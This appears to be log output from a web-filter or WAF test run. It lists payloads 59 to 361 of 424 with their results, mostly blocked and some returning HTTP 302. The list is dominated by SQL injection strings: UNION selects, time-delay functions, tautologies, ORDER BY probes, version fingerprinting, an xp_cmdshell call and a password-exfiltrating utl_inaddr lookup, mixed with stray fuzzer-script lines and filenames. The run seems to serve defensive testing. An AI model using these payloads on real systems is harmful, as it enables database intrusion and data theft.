+[ 59/424] \\n\\' union all select cast(dbms_pipe.receive_message((\\'a [DROP] BLOCKED/DROPPED (timeout)
+[ 60/424] \\r\\n' union all select cast(dbms_pipe.receive_message(('a' [DROP] BLOCKED/DROPPED (timeout)
+[ 61/424] union all select cast(dbms_pipe.receive_message(1,120) as in [DROP] BLOCKED/DROPPED (timeout)
+[ 62/424] \\r\\n' union all select dbms_pipe.receive_message(('a'),120 [DROP] BLOCKED/DROPPED (timeout)
+[ 63/424] \\n union all select cast(dbms_pipe.receive_message(1,120) a [DROP] BLOCKED/DROPPED (timeout)
+[ 64/424] 0x00\' union all select null,null,null,null,null,null --     [DROP] BLOCKED/DROPPED (timeout)
+[ 65/424] \r\n union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 66/424] union all select cast(dbms_pipe.receive_message(1,120) as in [DROP] BLOCKED/DROPPED (timeout)
+[ 67/424] \r\n' union all select 1337,1337,1337,1337,1337,1337,1337,13 [DROP] BLOCKED/DROPPED (timeout)
+[ 68/424] \r\n union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 69/424] %0d%0a union all select dbms_pipe.receive_message(('a'),120) [DROP] BLOCKED/DROPPED (timeout)
+[ 70/424] \n union all select cast(dbms_pipe.receive_message((\'a\'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 71/424] \r\n\' union all select cast(dbms_pipe.receive_message(1,120 [DROP] BLOCKED/DROPPED (timeout)
+[ 72/424] %00' union all select 1337,1337,1337 from dual --            [DROP] BLOCKED/DROPPED (timeout)
+[ 73/424] \n union all select dbms_pipe.receive_message(1,120),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[ 74/424] 0x00\\' union all select dbms_pipe.receive_message(1,120),nu [DROP] BLOCKED/DROPPED (timeout)
+[ 75/424] 0x00 union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 76/424] 0x0d0a' union all select cast(dbms_pipe.receive_message(1,12 [DROP] BLOCKED/DROPPED (timeout)
+[ 77/424] 0x0d0a\' union all select cast(dbms_pipe.receive_message(1,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 78/424] ' union all select '1337','1337','1337','1337','1337','1337' [DROP] BLOCKED/DROPPED (timeout)
+[ 79/424] UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 80/424] 0x00\\' union all select null,null from dual --              [DROP] BLOCKED/DROPPED (timeout)
+[ 81/424] \r\n union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 82/424] union all select 1337,1337,1337 --                           [DROP] BLOCKED/DROPPED (timeout)
+[ 83/424] 0x0d0a\\' union all select cast(dbms_pipe.receive_message((\ [DROP] BLOCKED/DROPPED (timeout)
+[ 84/424] 0x0a union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 85/424] union all select dbms_pipe.receive_message(('a'),120),'1337' [DROP] BLOCKED/DROPPED (timeout)
+[ 86/424] 0x00\\' union all select cast(dbms_pipe.receive_message(1,12 [DROP] BLOCKED/DROPPED (timeout)
+[ 87/424] %0d%0a union all select cast(dbms_pipe.receive_message(('a') [DROP] BLOCKED/DROPPED (timeout)
+[ 88/424] 0x0a union all select '1337','1337','1337','1337','1337','13 [DROP] BLOCKED/DROPPED (timeout)
+[ 89/424] \\n\\' union all select cast(dbms_pipe.receive_message((\\'a [DROP] BLOCKED/DROPPED (timeout)
+[ 90/424] \\n' union all select null,null,null,null --                 [DROP] BLOCKED/DROPPED (timeout)
+[ 91/424] 0x00' union all select dbms_pipe.receive_message(1,120),null [DROP] BLOCKED/DROPPED (timeout)
+[ 92/424] \r\n union all select cast(dbms_pipe.receive_message((\'a\') [DROP] BLOCKED/DROPPED (timeout)
+[ 93/424] \n union all select dbms_pipe.receive_message((\'a\'),120),' [DROP] BLOCKED/DROPPED (timeout)
+[ 94/424] %0a union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 95/424] \\r\\n union all select dbms_pipe.receive_message(('a'),120) [DROP] BLOCKED/DROPPED (timeout)
+[ 96/424] \r\n' union all select cast(dbms_pipe.receive_message(('a'), [DROP] BLOCKED/DROPPED (timeout)
+[ 97/424] 0x0d0a\\' union all select '1337','1337','1337','1337','1337 [DROP] BLOCKED/DROPPED (timeout)
+[ 98/424] 0x0d0a\\' union all select cast(dbms_pipe.receive_message(1, [DROP] BLOCKED/DROPPED (timeout)
+[ 99/424] \r\n union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[100/424] union all select '1337','1337','1337','1337','1337','1337',' [DROP] BLOCKED/DROPPED (timeout)
+[101/424] root' or 1=1--                                               [DROP] BLOCKED/DROPPED (timeout)
+[102/424] AND 7506=9091 AND (5913=5913                                 [DROP] BLOCKED/DROPPED (timeout)
+[103/424] root" or 1=1                                                 [DROP] BLOCKED/DROPPED (timeout)
+[104/424] root'or 1=1 or ''='                                          [DROP] BLOCKED/DROPPED (timeout)
+[105/424] AND 7300=7300 AND ('pKlZ'='pKlZ                              [DROP] BLOCKED/DROPPED (timeout)
+[106/424] or 1=1--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[107/424] AND 1=0 AND '%'='                                            [DROP] BLOCKED/DROPPED (timeout)
+[108/424] AS INJECTX WHERE 1=1 AND 1=0#                                [DROP] BLOCKED/DROPPED (timeout)
+[109/424] 2 and 456=678                                                [DROP] BLOCKED/DROPPED (timeout)
+[110/424] hi or 1=1 --"                                                [DROP] BLOCKED/DROPPED (timeout)
+[111/424] OR 1=0--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[112/424] 0x00 or 20=20                                                [DROP] BLOCKED/DROPPED (timeout)
+[113/424] WHERE 1=1 AND 1=0#                                           [DROP] BLOCKED/DROPPED (timeout)
+[114/424] OR 3409=3409 AND ('pytW' LIKE 'pytY                          [DROP] BLOCKED/DROPPED (timeout)
+[115/424] AND 7300=7300 AND ('pKlZ'='pKlY                              [DROP] BLOCKED/DROPPED (timeout)
+[116/424] AND 7506=9091 AND ('5913=5913                                [DROP] BLOCKED/DROPPED (timeout)
+[117/424] badparams=`echo "$cleanoutput" | replace "$payload" "a\" or  [DROP] BLOCKED/DROPPED (timeout)
+[118/424] badparams=`echo "$cleanoutput" | replace "$payload" "a' or 7 [DROP] BLOCKED/DROPPED (timeout)
+[119/424] AND 1=1                                                      [DROP] BLOCKED/DROPPED (timeout)
+[120/424] or 1=1 /*                                                    [DROP] BLOCKED/DROPPED (timeout)
+[121/424] admin" or 1=1#                                               [DROP] BLOCKED/DROPPED (timeout)
+[122/424] OR 1=1#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[123/424] WHERE 1=1 AND 1=1                                            [DROP] BLOCKED/DROPPED (timeout)
+[124/424] AND 1=1                                                      [DROP] BLOCKED/DROPPED (timeout)
+[125/424] or 20=20                                                     [DROP] BLOCKED/DROPPED (timeout)
+[126/424] root' or 1=1/*                                               [DROP] BLOCKED/DROPPED (timeout)
+[127/424] 0x0d0a\\' or 20=20 --                                        [DROP] BLOCKED/DROPPED (timeout)
+[128/424] \\n' or 20=20 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[129/424] 23 or 1=1; --                                                [DROP] BLOCKED/DROPPED (timeout)
+[130/424] AS INJECTX WHERE 1=1 AND 1=0                                 [DROP] BLOCKED/DROPPED (timeout)
+[131/424] %0d%0a\\' or 20=20 --                                        [DROP] BLOCKED/DROPPED (timeout)
+[132/424] AS INJECTX WHERE 1=1 AND 1=1#                                [DROP] BLOCKED/DROPPED (timeout)
+[133/424] ‘ or 1=1 --                                                [DROP] BLOCKED/DROPPED (timeout)
+[134/424] \\r\\n or 20=20                                              [DROP] BLOCKED/DROPPED (timeout)
+[135/424] or 1=1 /*                                                    [DROP] BLOCKED/DROPPED (timeout)
+[136/424] OR 1=1--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[137/424] OR 1=1#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[138/424] AS INJECTX WHERE 1=1 AND 1=1#                                [DROP] BLOCKED/DROPPED (timeout)
+[139/424] " or 1=1                                                     [DROP] BLOCKED/DROPPED (timeout)
+[140/424] or 0=0 --                                                    [DROP] BLOCKED/DROPPED (timeout)
+[141/424] ' or 3=3 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[142/424] or 1=1--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[143/424] or%201=1 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[144/424] a" or 1=1--                                                  [DROP] BLOCKED/DROPPED (timeout)
+[145/424] or 1=1/*                                                     [DROP] BLOCKED/DROPPED (timeout)
+[146/424] admin" or 1=1/*                                              [DROP] BLOCKED/DROPPED (timeout)
+[147/424] \' or 20=20 --                                               [DROP] BLOCKED/DROPPED (timeout)
+[148/424] AS INJECTX WHERE 1=1 AND 1=1                                 [DROP] BLOCKED/DROPPED (timeout)
+[149/424] %0a\' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[150/424] ' or 0=0 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[151/424] \n' or 20=20 --                                              [DROP] BLOCKED/DROPPED (timeout)
+[152/424] %0a or 20=20                                                 [DROP] BLOCKED/DROPPED (timeout)
+[153/424] AND 7300=7300 AND 'pKlZ'='pKlY                               [DROP] BLOCKED/DROPPED (timeout)
+[154/424] WHERE 1=1 AND 1=1--                                          [DROP] BLOCKED/DROPPED (timeout)
+[155/424] AND 1083=1083 AND ('1427=1427                                [DROP] BLOCKED/DROPPED (timeout)
+[156/424] badparams=`echo "$cleanoutput" | replace "$payload" "a\" or  [DROP] BLOCKED/DROPPED (timeout)
+[157/424] " or 1=1--                                                   [DROP] BLOCKED/DROPPED (timeout)
+[158/424] OR 1=0#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[159/424] ' or 1=1 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[160/424] AND 1=1 AND '%'='                                            [DROP] BLOCKED/DROPPED (timeout)
+[161/424] a' or 3=3--                                                  [DROP] BLOCKED/DROPPED (timeout)
+[162/424] \n or 20=20                                                  [DROP] BLOCKED/DROPPED (timeout)
+[163/424] \\r\\n' or 20=20 --                                          [DROP] BLOCKED/DROPPED (timeout)
+[164/424] AND 1=1 AND '%'='                                            [DROP] BLOCKED/DROPPED (timeout)
+[165/424] or 1=1#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[166/424] 0x0a' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[167/424] %00' or 20=20 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[168/424] ' and 1=0) union all                                         [DROP] BLOCKED/DROPPED (timeout)
+[169/424] %00\' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[170/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[171/424] obuff=$obuff"%2f%2a%5b%31%5d"                                [DROP] BLOCKED/DROPPED (timeout)
+[172/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[173/424] end="%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c% [DROP] BLOCKED/DROPPED (timeout)
+[174/424] ")))) and 0=benchmark(3000000,MD5(1))%20%23                  [DROP] BLOCKED/DROPPED (timeout)
+[175/424] N) # Filter Evasion Intermediary chars ' ' => '%2f%2a%0B%0C% [DROP] BLOCKED/DROPPED (timeout)
+[176/424] '))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[177/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[178/424] %27%20or%201=1                                               [WARN] HTTP 302
+[179/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[180/424] ' and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[181/424] vbuff="%2f%2a%5b$xcount%5d"                                  [DROP] BLOCKED/DROPPED (timeout)
+[182/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[183/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[184/424] " and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[185/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[186/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[187/424] echo "  -z Multi-byte quote                   '''        '%b [DROP] BLOCKED/DROPPED (timeout)
+[188/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[189/424] ") and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[190/424] encodeoutput=`echo $encodeoutput | replace "%20" "%234i5ugh4 [DROP] BLOCKED/DROPPED (timeout)
+[191/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[192/424] echo "  -N Intermediary chars space           ' '        '%2 [DROP] BLOCKED/DROPPED (timeout)
+[193/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[194/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[195/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[196/424] end="%20%6f%72%20%2f%61%5b%27%61"                            [DROP] BLOCKED/DROPPED (timeout)
+[197/424] ))) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[198/424] ) and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[199/424] ')) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[200/424] and 0=benchmark(3000000,MD5(1))%20%23                        [DROP] BLOCKED/DROPPED (timeout)
+[201/424] )))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[202/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[203/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[204/424] begin="%33%34%35%27%29%5d"                                   [DROP] BLOCKED/DROPPED (timeout)
+[205/424] ')))) and 0=benchmark(3000000,MD5(1))%20%23                  [DROP] BLOCKED/DROPPED (timeout)
+[206/424] echo "  -w Comment+newline space              ' '        '%2 [DROP] BLOCKED/DROPPED (timeout)
+[207/424] "))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[208/424] end="%20%6f%72%20%27%65%27%3d%27%72"                         [DROP] BLOCKED/DROPPED (timeout)
+[209/424] ")) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[210/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[211/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[212/424] ') and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[213/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[214/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[215/424] /uploads/plus/rss.php?tid=1&_Cs[][1]&_Cs[2%29%29%20AND%20%22 [DROP] BLOCKED/DROPPED (timeout)
+[216/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[217/424] )) and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[218/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[219/424] 0x00;select case when 20=20 then 'a'||dbms_pipe.receive_mess [DROP] BLOCKED/DROPPED (timeout)
+[220/424] RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE  [DROP] BLOCKED/DROPPED (timeout)
+[221/424] 0x0a\' or 20<94 --                                           [DROP] BLOCKED/DROPPED (timeout)
+[222/424] 0x0a or 'xyz'='xyz'                                          [DROP] BLOCKED/DROPPED (timeout)
+[223/424] 0x0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)       [DROP] BLOCKED/DROPPED (timeout)
+[224/424] 0x0a';select banner from v$version --                        [DROP] BLOCKED/DROPPED (timeout)
+[225/424] 0x00\';select @@version --                                   [DROP] BLOCKED/DROPPED (timeout)
+[226/424] 0x0a;select @@version                                        [DROP] BLOCKED/DROPPED (timeout)
+[227/424] 0x730065006c00650063007400200040004000760065007200730069006f [DROP] BLOCKED/DROPPED (timeout)
+[228/424] 0x0d0a or 1337=dbms_pipe.receive_message(1,120)              [DROP] BLOCKED/DROPPED (timeout)
+[229/424] 0x0a\\';select version from v$instance --                    [DROP] BLOCKED/DROPPED (timeout)
+[230/424] 0x00 or 1337=dbms_pipe.receive_message(1,120)                [DROP] BLOCKED/DROPPED (timeout)
+[231/424] 0x00' or 1337=dbms_pipe.receive_message(1,120) --            [DROP] BLOCKED/DROPPED (timeout)
+[232/424] 0x0a and 1337=dbms_pipe.receive_message(1,120) --            [DROP] BLOCKED/DROPPED (timeout)
+[233/424] 0x0a and 1337=dbms_pipe.receive_message(('a'),120)           [DROP] BLOCKED/DROPPED (timeout)
+[234/424] 0x00';select version from v$instance --                      [DROP] BLOCKED/DROPPED (timeout)
+[235/424] declare @q nvarchar (200) 0x730065006c0065006300740020004000 [DROP] BLOCKED/DROPPED (timeout)
+[236/424] 0x0a\\';select case when 20=20 then \\'a\\'||dbms_pipe.recei [DROP] BLOCKED/DROPPED (timeout)
+[237/424] 0x00\' or \'xyz\'=\'xyz                                      [DROP] BLOCKED/DROPPED (timeout)
+[238/424] 0x770061006900740066006F0072002000640065006C0061007900200027 [DROP] BLOCKED/DROPPED (timeout)
+[239/424] 0x0a\\' or \\'xyz\\'=\\'xyz\\' --                            [DROP] BLOCKED/DROPPED (timeout)
+[240/424] 0x00';select case when 20=20 then 'a'||dbms_pipe.receive_mes [DROP] BLOCKED/DROPPED (timeout)
+[241/424] 0x00' or 1337=dbms_pipe.receive_message(('a'),120) --        [DROP] BLOCKED/DROPPED (timeout)
+[242/424] 0x00 or \\'xyz\\'=\\'xyz\\'                                  [DROP] BLOCKED/DROPPED (timeout)
+[243/424] declare @q nvarchar (200) 0x730065006c00650063 ...           [DROP] BLOCKED/DROPPED (timeout)
+[244/424] 0x0a' and 1337=dbms_pipe.receive_message(1,120) --           [DROP] BLOCKED/DROPPED (timeout)
+[245/424] 0x0a;select @@version --                                     [DROP] BLOCKED/DROPPED (timeout)
+[246/424] 0x0d0a' or 1337=dbms_pipe.receive_message(('a'),120) --      [DROP] BLOCKED/DROPPED (timeout)
+[247/424] 0x77616974666F722064656C61792027303A303A313027 ...           [DROP] BLOCKED/DROPPED (timeout)
+[248/424] 0x0d0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) --   [DROP] BLOCKED/DROPPED (timeout)
+[249/424] %00 or 1337=dbms_pipe.receive_message((\'a\'),120) --        [DROP] BLOCKED/DROPPED (timeout)
+[250/424] %00' or 'xyz'='xyz' --                                       [DROP] BLOCKED/DROPPED (timeout)
+[251/424] %00;select version() --                                      [DROP] BLOCKED/DROPPED (timeout)
+[252/424] %00;select @@version --                                      [DROP] BLOCKED/DROPPED (timeout)
+[253/424] %00\';select version from v$instance --                      [DROP] BLOCKED/DROPPED (timeout)
+[254/424] %00;select banner from v$version                             [WARN] HTTP 302
+[255/424] echo "%00"$quack >> nullpayloads.txt                         [DROP] BLOCKED/DROPPED (timeout)
+[256/424] %00 or 1337=dbms_pipe.receive_message(1,120) --              [DROP] BLOCKED/DROPPED (timeout)
+[257/424] %00' or 20<94 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[258/424] %00 and 1337=dbms_pipe.receive_message((\'a\'),120) --       [DROP] BLOCKED/DROPPED (timeout)
+[259/424] %00 or \\'xyz\\'=\\'xyz\\' --                                [DROP] BLOCKED/DROPPED (timeout)
+[260/424] %00' or 1337=dbms_pipe.receive_message(1,120) --             [DROP] BLOCKED/DROPPED (timeout)
+[261/424] %00 and 1337=dbms_pipe.receive_message((\\'a\\'),120) --     [DROP] BLOCKED/DROPPED (timeout)
+[262/424] %00;select case when 20=20 then \'a\'||dbms_pipe.receive_mes [DROP] BLOCKED/DROPPED (timeout)
+[263/424] %00;select banner from v$version --                          [DROP] BLOCKED/DROPPED (timeout)
+[264/424] %00\';select case when 20=20 then \'a\'||dbms_pipe.receive_m [DROP] BLOCKED/DROPPED (timeout)
+[265/424] %00\\' or \\'xyz\\'=\\'xyz                                   [DROP] BLOCKED/DROPPED (timeout)
+[266/424] %00 or \'xyz\'=\'xyz\' --                                    [DROP] BLOCKED/DROPPED (timeout)
+[267/424] %00;select case when 20=20 then 'a'||dbms_pipe.receive_messa [DROP] BLOCKED/DROPPED (timeout)
+[268/424] %00\\';select version() --                                   [DROP] BLOCKED/DROPPED (timeout)
+[269/424] ORDER BY 16                                                  [WARN] HTTP 302
+[270/424] ORDER BY 26--                                                [DROP] BLOCKED/DROPPED (timeout)
+[271/424] \\';select @@version --                                      [DROP] BLOCKED/DROPPED (timeout)
+[272/424] %0a;select version() --                                      [DROP] BLOCKED/DROPPED (timeout)
+[273/424] and (select substring(@@version,1,1))='M'                    [DROP] BLOCKED/DROPPED (timeout)
+[274/424] or 1 in (select @@version)--                                 [DROP] BLOCKED/DROPPED (timeout)
+[275/424] ORDER BY 22                                                  [WARN] HTTP 302
+[276/424] %0d%0a';select @@version --                                  [DROP] BLOCKED/DROPPED (timeout)
+[277/424] ORDER BY 10#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[278/424] and (select substring(@@version,2,1))='i'                    [DROP] BLOCKED/DROPPED (timeout)
+[279/424] ORDER BY 24--                                                [DROP] BLOCKED/DROPPED (timeout)
+[280/424] a' order by 9999#                                            [DROP] BLOCKED/DROPPED (timeout)
+[281/424] ORDER BY 3--                                                 [DROP] BLOCKED/DROPPED (timeout)
+[282/424] \n';select version() --                                      [DROP] BLOCKED/DROPPED (timeout)
+[283/424] \r\n;select @@version                                        [DROP] BLOCKED/DROPPED (timeout)
+[284/424] ORDER BY 2--                                                 [DROP] BLOCKED/DROPPED (timeout)
+[285/424] ORDER BY 16                                                  [WARN] HTTP 302
+[286/424] ORDER BY 16#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[287/424] ORDER BY 27                                                  [WARN] HTTP 302
+[288/424] ORDER BY 25                                                  [WARN] HTTP 302
+[289/424] %0d%0a\';select version() --                                 [DROP] BLOCKED/DROPPED (timeout)
+[290/424] ORDER BY 4#                                                  [DROP] BLOCKED/DROPPED (timeout)
+[291/424] ORDER BY 2#                                                  [DROP] BLOCKED/DROPPED (timeout)
+[292/424] ORDER BY 1--                                                 [DROP] BLOCKED/DROPPED (timeout)
+[293/424] ORDER BY 28--                                                [DROP] BLOCKED/DROPPED (timeout)
+[294/424] ORDER BY 24#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[295/424] \\r\\n';select @@version --                                  [DROP] BLOCKED/DROPPED (timeout)
+[296/424] ORDER BY 16--                                                [DROP] BLOCKED/DROPPED (timeout)
+[297/424] 1' ORDER BY 2--+                                             [DROP] BLOCKED/DROPPED (timeout)
+[298/424] ORDER BY 2                                                   [WARN] HTTP 302
+[299/424] 1,test-2.sqlite                                              [WARN] HTTP 302
+[300/424] badparams=`echo "$cleanoutput" | replace "$payload" "$numera [DROP] BLOCKED/DROPPED (timeout)
+[301/424] x' AND 1=(SELECT COUNT(*) FROM tabname); --                  [DROP] BLOCKED/DROPPED (timeout)
+[302/424] 4,run-423.sqlite                                             [WARN] HTTP 302
+[303/424] \r\n;select version from v$instance --                       [DROP] BLOCKED/DROPPED (timeout)
+[304/424] 4,run-134.sqlite                                             [WARN] HTTP 302
+[305/424] echo "  -e SQL delay injection"                              [DROP] BLOCKED/DROPPED (timeout)
+[306/424] while [[ $ahcount -le $maxxcount ]] ; do                     [WARN] HTTP 302
+[307/424] 7,db-setup.sqlite                                            [WARN] HTTP 302
+[308/424] '                                                            [DROP] BLOCKED/DROPPED (timeout)
+[309/424] 1,testcod-1000055.sqlite3                                    [DROP] BLOCKED/DROPPED (timeout)
+[310/424] 4,run-907.sqlite                                             [WARN] HTTP 302
+[311/424] 4,run-259.sqlite                                             [WARN] HTTP 302
+[312/424] t'exec master..xp_cmdshell 'nslookup www.google.com'--       [DROP] BLOCKED/DROPPED (timeout)
+[313/424] %0d%0a union all select cast(dbms_pipe.receive_message(('a') [DROP] BLOCKED/DROPPED (timeout)
+[314/424] 1,padu-destination.sqlite                                    [DROP] BLOCKED/DROPPED (timeout)
+[315/424] 4,run-377.sqlite                                             [WARN] HTTP 302
+[316/424] ' or ''&'                                                    [DROP] BLOCKED/DROPPED (timeout)
+[317/424] 4,run-530.sqlite                                             [WARN] HTTP 302
+[318/424] inputbuffer=`echo $inputbuffer | replace " " "/*d*/"`        [DROP] BLOCKED/DROPPED (timeout)
+[319/424] 8,run-97.sqlite                                              [WARN] HTTP 302
+[320/424] elif [[ "$xp" == "dualconditionalnumeric" ]] ; then          [DROP] BLOCKED/DROPPED (timeout)
+[321/424] 4,run-480.sqlite                                             [WARN] HTTP 302
+[322/424] 1' GROUP BY 1,2,--+                                          [DROP] BLOCKED/DROPPED (timeout)
+[323/424] self.log.error('Could not create SQLite database. Please try [DROP] BLOCKED/DROPPED (timeout)
+[324/424] 4,run-403.sqlite                                             [WARN] HTTP 302
+[325/424] if [[ "$status_true" != "$status_false" && "$status_true" == [DROP] BLOCKED/DROPPED (timeout)
+[326/424] length_false=`echo $response | cut -d ":" -f 2`              [DROP] BLOCKED/DROPPED (timeout)
+[327/424] a'||/**/456=678#                                             [DROP] BLOCKED/DROPPED (timeout)
+[328/424] ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWOR [DROP] BLOCKED/DROPPED (timeout)
+[329/424] 4,run-326.sqlite                                             [WARN] HTTP 302
+[330/424] 4,run-338.sqlite                                             [WARN] HTTP 302
+[331/424] static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`         [DROP] BLOCKED/DROPPED (timeout)
+[332/424] headertoset="$headertoadd"                                   [DROP] BLOCKED/DROPPED (timeout)
+[333/424] inurl:&#8221;games.php?id=                                   [DROP] BLOCKED/DROPPED (timeout)
+[334/424] 4,run-138.sqlite                                             [WARN] HTTP 302
+[335/424] ? ? ???-?-?-?!??                                    [WARN] HTTP 302
+[336/424] if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POS [DROP] BLOCKED/DROPPED (timeout)
+[337/424] J) # Filter Evasion nesting 'select' => 'selselectect'       [DROP] BLOCKED/DROPPED (timeout)
+[338/424] 10,run-18.sqlite                                             [WARN] HTTP 302
+[339/424] 4,run-430.sqlite                                             [WARN] HTTP 302
+[340/424] 4,run-921.sqlite                                             [WARN] HTTP 302
+[341/424] 1,oqmd-1514.sqlite3                                          [DROP] BLOCKED/DROPPED (timeout)
+[342/424] 1,test-rel.sqlite3                                           [WARN] HTTP 302
+[343/424] tput sgr0 # Reset attributes.                                [DROP] BLOCKED/DROPPED (timeout)
+[344/424] badparams=`echo "$cleanoutput" | replace "$payload" "1/(case [DROP] BLOCKED/DROPPED (timeout)
+[345/424] %0d%0a\\' and 1337=dbms_pipe.receive_message(1,120) --       [DROP] BLOCKED/DROPPED (timeout)
+[346/424] echo "XPath element hierachy found at ./output/$safelogname. [DROP] BLOCKED/DROPPED (timeout)
+[347/424] echo "POST" $outer"???"$mparams                              [DROP] BLOCKED/DROPPED (timeout)
+[348/424] nullwrongstring=$nullwrongstring"null"                       [DROP] BLOCKED/DROPPED (timeout)
+[349/424] while [[ $attgcount -le $maxxcount ]] ; do                   [WARN] HTTP 302
+[350/424] if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then          [WARN] HTTP 302
+[351/424] 4,run-850.sqlite                                             [WARN] HTTP 302
+[352/424] ' or uname like '%                                           [DROP] BLOCKED/DROPPED (timeout)
+[353/424] 4,run-967.sqlite                                             [WARN] HTTP 302
+[354/424] 4,run-307.sqlite                                             [WARN] HTTP 302
+[355/424] create user name identified by 'pass123'                     [DROP] BLOCKED/DROPPED (timeout)
+[356/424] " or "" "                                                    [DROP] BLOCKED/DROPPED (timeout)
+[357/424] 4,run-779.sqlite                                             [WARN] HTTP 302
+[358/424] or '7659'='7659                                              [DROP] BLOCKED/DROPPED (timeout)
+[359/424] 4,run-102.sqlite                                             [WARN] HTTP 302
+[360/424] )) and 0=benchmark(3000000,MD5(1))%20--                      [DROP] BLOCKED/DROPPED (timeout)
+[361/424] stringofparams=`echo $params | tr "&" " "`                   [DROP] BLOCKED/DROPPED (timeout)
